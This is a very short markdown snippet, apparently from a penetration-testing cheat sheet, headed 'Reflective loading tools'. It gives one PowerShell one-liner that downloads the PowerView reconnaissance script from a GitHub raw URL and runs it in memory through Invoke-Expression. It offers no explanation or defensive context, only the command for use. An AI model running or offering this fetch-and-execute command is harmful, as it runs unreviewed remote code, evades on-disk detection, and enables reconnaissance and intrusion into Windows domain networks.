# Reflective loading tools

PowerView
```powershell
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerView.ps1') | IEX
```
